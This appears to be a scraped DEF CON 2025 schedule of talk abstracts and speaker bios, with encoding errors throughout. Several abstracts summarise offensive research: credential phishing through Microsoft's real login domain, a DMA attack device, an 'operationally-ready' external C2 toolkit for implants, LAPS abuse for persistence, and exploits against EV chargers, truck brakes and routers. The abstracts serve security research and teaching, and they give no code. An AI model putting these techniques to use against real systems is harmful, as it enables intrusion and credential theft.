github link - https://github.com/groovyBugify/aws-security-mcp


Instantly locate resources by IP, tag, name or any attribute across your entire infrastructure
Generate threat models on-demand for specific services or team resources
Visualize attack paths and potential privilege escalation routes
Perform blast radius analysis to understand the impact of potential compromises
Seamlessly search across GuardDuty, SecurityHub, and IAM Access Analyzer findings
Ask natural questions like "Which EC2 instances have public IPs and excessive IAM permissions?"


We will also be covering how we designed the tool to maintain context and token size limits for any MCP Clients. 

During my years leading cloud security and bug bounty hunting, I've repeatedly faced the frustration of piecing together information scattered across multiple AWS services. This tool solves that problem by providing a conversation layer that maintains context across your entire infrastructure.

In this talk, I'll demonstrate real-world scenarios where AWS Security MCP helped identify complex security issues that traditional tools missed. For instance, discovering a privilege escalation path that crossed boundaries between EC2, IAM, and S3 which appeared as low-severity individual findings but created a critical attack path when combined.

I'll show how you can:


Instantly identify which team owns a mysterious IP address appearing in your logs
Visualize the network connectivity between your microservices
Generate security assessments for resources tagged to specific applications
Uncover hidden attack paths by analyzing IAM permission chains


The tool is open-source and available today - you can start using it immediately after the talk to gain deeper insights into your own AWS environments

Microsoft Entra ID â one of the most used identity providers in the enterprise market. Or from our perspective: the most targeted platform in phishing attacks.
Getting our phishing infrastructure up and running is usually the easy part. The real challenge is often keeping it online long enough to deliver the phishing link and collect credentials without detection before it gets burned.

But what if we could use Microsoft's official login domain for our phishing purposes? And no, I'm not talking about the heavily mitigated OAuth Consent or Device Code Phishing techniques, or simply hosting a phishing page on Azure Web App subdomains. I'm talking about stealing credentials directly from the legitimate login.microsoftonline.com domain.

In this talk, I will share multiple novel methods that can be used to achieve this. And the best of all? It all relies on legitimate functionality, making it mostly unpatchable. ð

Description:
DMA vulnerabilities aren't new - but they don't seem to have gone anywhere. In the time software attacks have gone from a single bug to a multi-stage exploit chain, DMA attacks have gone from slipping some hardware into an internal slot of a computer to... plugging in an external device?

Despite decades of attacks, tooling, and even mitigations, most systems are still wide open to these attacks because of their perceived difficulty, poor system configuration, and lack of effective testing mechanisms.

Epic Erebus is a new tool that tries to address these issues. It's small, portable, and easy to use. It can slip through most systems unless the hardware, bios, and operating system are properly configured (a rarity). Finally, it's an entirely open PCIe implementation that gives you full control over Transaction Layer Packets - allowing you to reverse engineer the PCIe Bus and the DMA mitigations in place (Get it? RE-Bus... Erebus!)

You should come away understanding what erebus is capable of, the basics of how to use it, and what to look out for when properly implementing DMA attack mitigations.

Description:
Modern software protectors increasingly rely on complex, often nested, virtualization techniques (VMProtect, Themida, custom solutions) which significantly hinder static and dynamic analysis. This talk introduces DragonSlayer, an automated framework combining symbolic execution with fine-grained dynamic taint tracking to systematically lift obfuscated bytecode from these protectors. Our approach precisely identifies VM handlers, recovers original instruction semantics, automatically unpacks multiple virtualization layers, and reconstructs analyzable representations of protected code. We demonstrate DragonSlayer's effectiveness against the latest commercial VM protectors and custom obfuscation solutions, significantly reducing analysis time from weeks to hours. This presentation includes technical deep-dives into our methodology, real-world case studies, and a demonstration of our tooling that helps reverse engineers slay the virtualization dragon.

Description:
Bloatware. We all hate it, and most of us are good at avoiding it. But some vendor tools â especially those managing critical drivers â can be useful when the Windows Update versions arenât good enough for performance-critical computing.

What started as a routine driver update took a sharp turn when I confirmed a reboot modalâ¦ from my browser. Wait, my browser shouldnât be able to do that!? To my disappointment (and maybe some surprise), it turned out to be arbitrary code execution â right from the browser. This kicked off a week-long deep dive, uncovering seven CVEs in seven days across several prominent vendors, all exploiting a common pattern: privileged services managing software on Windows with little regard for security.

In this talk, Iâll walk through the journey of discovery and exploitation of several vulnerabilities that lead to LPE/RCE. I'll cover everything from the initial attack surface discovery, reverse engineering and finally exploitation of several vulnerabilities. By the end, participants will probably be uninstalling similar software mid-session. While the exploitation journey is fun and impactful, this isnât the kind of âaccess everywhereâ anyone wants. Itâs 2025 â we have everything we need to do better.

Description:
In March, former national security advisor Mike Waltz accidentally invited a journalist into his war crimes Signal group with other senior Trump officials. âWe are currently clean on OPSEC,â secretary of defense Pete Hegseth posted to the group. In May, Waltz was photographed clandestinely checking his Signal messages under the table during a cabinet meeting.

Only it turns out, Waltz was actually using a knock-off of Signal called TM SGNL. Immediately after that, TeleMessage (the company that makes TM SNGL) was hacked, and the hacker was able to access plaintext Signal messages. It was then hacked again, and the second hacker exfiltrated hundreds of gigabytes of data before TeleMessage took its service offline.

This talk is about the entire Signalgate saga: the journalist getting invited to the Signal group; Trump officials lying to Congress; the history of TeleMessage, which was founded by a former Israeli spook; an analysis of the TM SGNL source code that proves the company lied about supporting end-to-end encryption; the trivial exploit that was used to extract data from TeleMessageâs archive server; and an analysis of hundreds of gigabytes of memory dumps full of chat logs from TeleMessage customers.

Between aging domains, TLS cert management, sandbox fingerprinting, and blue teams getting smarter at categorizing traffic and infrastructure, your custom C2 feels less covert and more like a liability. Red teams and threat actors alike are shifting toward living off legitimate services âÃÃ® AWS, GitHub, Box, Notion, whatever blends in âÃÃ® but building solutions that are custom to a single C2 framework? LetâÃÃ´s stop doing that. LetâÃÃ´s share the fun! C4 (Cross-Compatible Command & Control) is here to change that. ItâÃÃ´s a modular toolkit of WASM-powered plugins that makes external C2 easy to implement, regardless of your implant's language or target OS. Whether youâÃÃ´re writing in C, Rust, Go, Python, C#, or something else entirely, C4 plugins can be loaded directly into your implant and run on Windows, macOS, or Linux. But the real game-changer? C4 provides a single, centralized collection of over 10 fully-documented, operationally-ready external C2 modules âÃÃ® not just proof-of-concepts, but production-level integrations with trusted sites that fly under the radar. No more hunting through GitHub repos, hand-rolling fragile API calls, or hacking together glue code for every new environment. Stop reinventing external C2 and start planting some C4 in your implants!

Description:
Maritime vessel controls and operational technology (OT) systems are getting more complex and interconnected. With industry trends aiming to reduce crew, automate tasks, and improve efficiency, these networks are expanding in scale, intricacy, and criticality for vessel operation and maintenance. The standard controller area network (CAN) bus for maritime vessel networks, developed by the National Marine Electronics Association (NMEA), known as NMEA2000. NMEA2000 is an application layer network protocol built on the ISO11783 standard and compatible with automotive SAEJ1939, it uses unique message identifiers known as Parameter Group Number, to define the data within each communication frame. Despite its widespread use, NMEA2000 remains a relatively unexplored domain, particularly in understanding normal versus abnormal network behavior, due to the unavailability of open-source datasets. To address this gap, we constructed a NMEA2000 system consisting of five nodes: GPS/Radar, Wind Speed/Direction sensor, and Multifunction Display. Using this setup, we collected datasets to analyze system behavior and developed deterministic fingerprints for each sensor, establishing a baseline of the normal operating system. We subject the system to controlled attacks to evaluate the accuracy and effectiveness of the fingerprints. This work represents a foundational step towards enhancing security and reliability in maritime OT systems.

Description:
The phrase ânational security impacts of offensive cyber in the healthcare sectorâ typically brings to mind images of destructive, obvious attacks on hospitals. It should also bring to mind the covert theft of vast troves of biological data. The PRC has a well established policy of stealing intellectual property as a path to development using tactics which have come, in recent years, to prominently feature hacking. The theft of US and allied biological data is crucial to our personal privacy, civil liberties, and national security and we must understand what data is most likely to be targeted in order to best defend it. In sectors other than biotechnology, PRC state-sponsored hacking often focuses on areas identified for development in major planning documents and areas to which the PRC party-state is already devoting significant financial resources to research. For this reason, it is useful to understand the intersection of PRC targeted areas for growth and development and areas in which stealing US sources of data is the easiest and most easily applicable to emerging biotechnology sectors. This talk identifies those sectors and discusses potential consequences.

Where: LVCC West-Level 1-Exhibit Hall 1-405 (Red Team Village)-RTV Track 1 - Map

Description:
This workshop will provide participants with the necessary knowledge to plan and execute red team exercises that accurately emulate real-world threat actors. Using MITRE ATT&CK as a foundation, attendees will learn how to map adversary tactics, techniques, and procedures (TTPs) to red team operations, ensuring realism down to the indicator of compromise (IOC) level. The workshop culminates with the hands-on development of a red team campaign to emulate an advanced persistent threat (APT) group. For this exercise, participants will receive simulated exercise objectives and rules of engagement and will use presented techniques to develop a basic red team campaign plan for successfully emulating the selected threat group.

Where: LVCC West-Level 2-W222-W223 (Voting Village Talks ) W222 - Map

Description:
End-to-End-Verifiability (E2E-V) is a cryptographic paradigm that, as applied to voting systems, allows voters to independently verify that their votes were cast as intended, guaranteeing that votes were recorded as cast, and tallied as recorded. As such, it is being promoted to public officers and elected officials at the county and state levels as the âmagic bulletâ allowing for secure voting over the internet. This talk will argue, in a relatively low-tech way, that E2E-V is irrelevant to some attacks â both to servers outside the cryptographic âloop,â and particularly to client-side systems. E2E-V-equipped voting systems are primarily vulnerable to client-side malware, which would still be free to alter or sabotage voting applications and devices. The talk will present opinions from technical experts on E2E-V. These perspectives are juxtaposed against opinions and rhetoric from the commercial promoters of internet voting systems.

You can start with the best intentions, solid tools, and all the right policies, but what happens when your network moves from âeffing aroundâ straight into âfinding outâ? Join a panel of variously traumatized incident responders as we swap war stories, dissect lessons learned, and reflect on the chaos, comedy, and career paths that come with IR. This isnât a dry postmortem â itâs a cathartic, honest, occasionally unhinged conversation about the realities of defending organizations when things go sideways. Whether youâre a grizzled responder or just IR-curious, come laugh, learn, and maybe even heal a little.

Description:
Ever wondered what happens after you hit "submit" on a bug bounty report? At T-Mobile, each submission kicks off a behind-the-scenes journey that spans teams, tools, and time zones. In this talk, weâll walk through the lifecycle of a bug bounty submissionâfrom Bugcrowdâs triage desk to our internal security workflowsâand show why not every finding is considered equal from a business risk perspective.

We'll demystify our internal process: how we prioritize, validate, assign ownership, and resolve reports. You'll see what makes a report fast-tracked to payoutâand what gets politely declined. Backed by stats, weâll reveal how many submissions we get, how many are duplicates or out of scope, and how we determine true impact.

Expect real war stories: from late-night calls and team escalations to reports that sent us scrambling. We'll also lighten the mood with a few âcreativeâ submissions that didnât quite hit the mark.

Most importantly, weâll share submission tips drawn from common pain pointsâwhat helps us help you, and how high-quality reports earn faster turnarounds, higher payouts, and opportunities like private programs, CVEs, and Bug Bashes.

Whether you're a seasoned hunter or just starting out, this session will give you an honest, inside look at how BBPs work from our endâand how you can maximize your success.

Description:
In this talk we present a collection of attacks against the most widely used EV charging protocol, by exploiting flaws in the underlying power-line communication technologies affecting almost all EVs and chargers.

Specifically, we target the QCA 7000 Homeplug modem series, used by the two most popular EV charging systems, CCS and NACS.

We demonstrate multiple new vulnerabilities in the modems, enabling persistent denial of service.

To better understand the scope of these issues, we conduct a study of EV chargers and vehicles, and show widespread insecurities in existing deployments.

We show a variety of practical real-world scenarios where the HomePlug link can be used to hijack EV charging communications, even at a distance.

Finally, we present results from reverse engineering the firmware and how we can gain code execution.

Description:
Tanker trailers? Turns out those aren't just big, dumb hunks of metal. They have a powerline network, PLC4TRUCKS, which is unintentionally accessible wirelessly (CVEs 2020-14514 and 2022-26131). We found new trailer brake controllers using diagnostic protocol KWP2000, secured with access control by seed-key (a challenge-response protocol). We'll show how to use Wireshark to analyze the diag. traffic. We'll discuss why randomness is critical for any challenge-response protocol.

We'll cover two ways to bypass this access control: using a SMT solver to crack the routine from a few request-response pairs (automated with AHK), and a classic reset attack that makes seeds entirely predictable. This second way allows for a blind, wireless attack, a finding now recognized as CVE-2024-12054. We'll detail how we ran timing search 'campaigns' with a custom sigrok decoder to PoC it.

The trailer brake controller is also at risk from trailer-installed telematics devices too. We'll show how to use Scapy Automotive's UDS scanner on a faked CAN bus for PLC4TRUCKS (plus modify that for a known seed-key routine) so we can get a picture of that attack surface.

This and the previous CVEs are a result of the heavy vehicle testing we do. We'll share some details of how we do onsite truck tests and how we do bench tests.

Description:
This research examines security oversights in a range of modern 4G/5G routers used in small businesses, industrial IoT, and everyday mobile deployments. Several of these routers contain vulnerabilities reminiscent of older security flaws, such as weak default credentials, inadequate authentication checks, and command injection pathways. By reverse-engineering firmware and testing for insecure endpoints, it was possible to demonstrate remote code execution, arbitrary SMS sending, and other serious exploits affecting Tuoshi and KuWFi devices.

Through practical examples, including Burp Suite requests and Ghidra disassembly, the talk highlights how these weaknesses can grant attackers root access, allow fraudulent activity, or compromise entire networks. In each case, mitigation strategies and best practicesâlike robust authentication, regular firmware updates, and network segmentationâare emphasized. Ultimately, this presentation underscores the importance of continuous security scrutiny, even for modern hardware, and encourages the community to stay vigilant and collaborate in uncovering and addressing such pervasive vulnerabilities.

Tags: DEF CON Official Talk
When: Saturday, Aug 9, 17:30 - 17:50 PDT

Description:
Voice cloning technology has advanced significantly, enabling the creation of convincing voice replicas using consumer-grade devices and publicly available tools. This poses critical challenges to aviation communication, where trust between pilots and air traffic controllers is paramount. The reliance on AM radio, with its low fidelity and lack of authentication, exacerbates the risk of fraudulent communications. This talk examines trust factors within aviation's air traffic control system, focusing on how air traffic controllers' voices can be cloned and where planes are most at risk. The talk explores FCC enforcement techniques for locating malicious actors, historical perspectives on alternative radio technologies, and the secondary systems pilots employ during communication failures. Simulated attacks will demonstrate how these vulnerabilities could disrupt operations, particularly at critical points such as runway crossings and in low-visibility conditions. 

To mitigate these risks, this talk evaluates existing safeguards, including the Traffic Collision Avoidance System (TCAS), and discusses emerging technologies such as stop bars and guided runway lighting.

Description:
Local Administrator Password Solution (LAPS) automates local admin password rotation and secure storage in Active Directory (AD) or Microsoft Entra ID. It ensures that each system has a unique and strong password.

In OverLAPS: Overriding LAPS Logic, we will revisit and extend our previous research (Malicious use of "Local Administrator Password Solution", Hack.lu 2017) by exposing client-side attacks in Windows LAPS ("LAPSv2"). After a brief overview of LAPS's evolution, from clear-text fields in AD with Microsoft LAPS ("LAPSv1") to encrypted AD attributes or Entra ID storage with Windows LAPS, we will explore the client-side logic of Windows LAPS. Unlike prior work that exfiltrates passwords only after directory compromise, we will focus on abusing LAPS to maintain presence on compromised endpoints, both on-prem and Entra-joined devices.

We will leverage PDB symbols and light static analysis to understand how LAPS works internally, then use Frida for dynamic hooking to capture, manipulate, and rotate admin passwords on demand. We will also reproduce Frida proof-of-concepts using Microsoft Detours for in-process hooks.

Attendees will gain practical insights into new attack vectors against Windows LAPS, enabling them to assess, reproduce, and defend against client-side attacks in their own environments.

Description:
The Commodore 64 home computer, which sold at least 12.5 million units from 1982 to 1994, was widely used during a formative early decade in the subcultures of hacking, phreaking, piracy, and cybercrime. Like ancient insects trapped in amber, discovered and studied millions of years later, ephemera of hacker history has been fortuitously preserved in the file system structures of C64 floppy disks from the 1980s and 90s. 

Enthusiasts and researchers have created byte-for-byte copies of disks in order to preserve games, applications, and demos of the time period. What is less obvious, however, is that users of the time tended to reuse disks, deleting old files to make space for new programs. This and other use patterns have resulted in interesting data being retained in unallocated sectors alongside the overtly-accessible programs and data. Often, this data can be recovered and includes logs of online sessions, hacker text files, and more.

In this talk, Dr. McGrew describes software and workflow he developed to perform forensic processing and full-text indexing of over 650,000 unique C64 floppy disk images from publicly-accessible online archives. He will also present interesting findings from searches and analysis that illustrate, for the modern audience, day-to-day hacker communications and tools of the past.

And itâs even harder to expand your attack surface to find pages that no one ever looked at it before. Donât get me wrongâI still think AI sucks at pentesting (sue me). It wonât chain exploits, think creatively, or outsmart a well-configured WAF. But here we are. Itâs really good at generating path/subdomains, and picking out the most important targets from a massive list. And lastly, AI can be a smart assistant that is specifically configured for the target appâs test. It handles the boring stuff, so you can focus on breaking things.x000D

In this talk, weâre not glorifying AIâweâre putting it to work. Smart, sharp, and right where it counts.

Hey! Iâm Ozgun (aka ozzy), a 25-year-old security researcher. By day, Iâm trying to live as a penetration tester. By night? Well, itâs a mixâsometimes hunting web bugs, sometimes sneaking around in red team ops, and sometimes just trying not to lose all my chips at poker.x000D

Iâve spoken at several conferences, including Hacktivity, BsidesPrague, and DEFCON. Lately, Iâve picked up a new hobbyâstudying LLMs and AI. Not the hype, but the scientific magic side of things. Iâve been exploring how to blend them into cybersecurity in smarter, more effective ways.

SpeakerBio:  Megan Allen
Hi, Iâm Megan Allen.

My work focuses on a holistic approach to health; moving the bodyâs natural energy into alignment with Earth and the seven chakras. I practice integrative wellness - honoring a person's emotional, mental, physical and spiritual well-being. I provide intuitive healing sessions and work with clients to relax the mind, increase body awareness and balance energy flow.

I also facilitate community wellness workshops, ceremonies and transformational group programs inviting participants to disconnect from their busy lives, turn inward and tap into the present to restore and maintain the bodyâs energetic balance and cultivate self-love, empowerment and sovereignty.

I inspire people to activate their highest potential in alignment with their wise hearts and to promote healing from within. I tailor my sessions to reflect this; using techniques from my healing disciplines as well as my love for Traditional Chinese Medicine, holistic aromatherapy, crystals and essential oils, tarot, animal medicine cards and a deep reverence for nature.

Nature is one of my greatest teachers. It constantly teaches me about grounding, stability, resilience, boundaries, growth, and stillness.

When: Saturday, Aug 9, 17:00 - 17:30 PDT
Where: LVCC West-Level 2-W222-W223 (Voting Village Talks ) W222 - Map

Description:
Physical security has long been a core component of voting system defenses through the use of keyed locks and tamper-evident seals/tape/stickers. With procedural protections requiring their use, arbitrary voters are explicitly permitted to physically interact with these systems in a semi-private setting (voting booth) under the assumption that the hardwareâs attack surface can be sufficiently- scoped to a set of intended, known-safe interactions (i.e. limit/prevent access to I/O interfaces, administrative controls, storage devices, etc.). Some have even cited these specific defenses as pre-existing and sufficient mitigations for vulnerabilities in already-deployed voting system such that further remediation is not needed. Unfortunately, this assumption does not hold under scrutiny. A review of publicly available sources from vendors, jurisdictions, and assorted other entities reveals substantial weaknesses in the design, configuration, and deployment of such defensive devices. In addition to recovering/matching voting system keys from depictions specific to more than half of U.S. states, their identity, ease of acquisition, and apparent default/universal configuration bodes poorly even for states without depictions sufficient to recover/match. Though less definitive, analogous concerns were found related to tamper-evident devices in design, selection, composition, and application such that reliance on their detective capabilities is uncertain at best. With near-identical issues affecting voting systems across vendors, products, and jurisdictions documented across more than a decadeâs worth of sources, the systemic failure of design, certification, and testing is readily apparent. While changes in the VVSG 2.0 standard serve as direct mprovements, they continue to leave predictable weaknesses lying in wait for future elections.

SpeakerBio:  Drew Springall, Auburn University
Drew Springall is an Assistant Professor of Computer Science at Auburn University, and is a hacker/security researcher with a focus on the technical/concrete aspects of voting system security. Since 2013, Drew has worked to understand and demonstrate the difficulty attackers would face should they attempt to attack such systems as deployed in the real-world and given realistic resources to leverage. Most recently, Drew has worked specifically on the DVSorder ballot randomization flaw and the âSecurity Analysis of Georgiaâs ImageCast X Ballot Marking Devicesâ report published along with Prof. J. Alex Halderman.

Description:
Feet Feud (Hacker Family Feud) is a Cybersecurity-themed Family Feud style game arranged by members of the OnlyFeet CTF team and hosted by Toeb3rius (aka Tib3rius). Both survey questions and their answers are crowd-sourced from the Cybersecurity community. Two teams (Left Foot and Right Foot) captained by Ali Diamond and John Hammond and comprised of audience members go head to head, trying to figure out the top answers to the survey questions.

Attendees can either watch the game or volunteer to play on one of the two teams. Audience participation is also encouraged if either of the two teams fails to get every answer of a survey question.

Ultimately Feet Feud is about having a laugh, watching people in the industry attempt to figure out what randomly surveyed people from the Cybersecurity community put as answers to a number of security / tech related questions.

Participant Prerequisites

Participants are chosen by team captains from the audience at the start of the show. In order to be fair, we try to select participants from all seating areas, so folks who show up later than others still have a chance to volunteer.

Pre-Qualification

None.
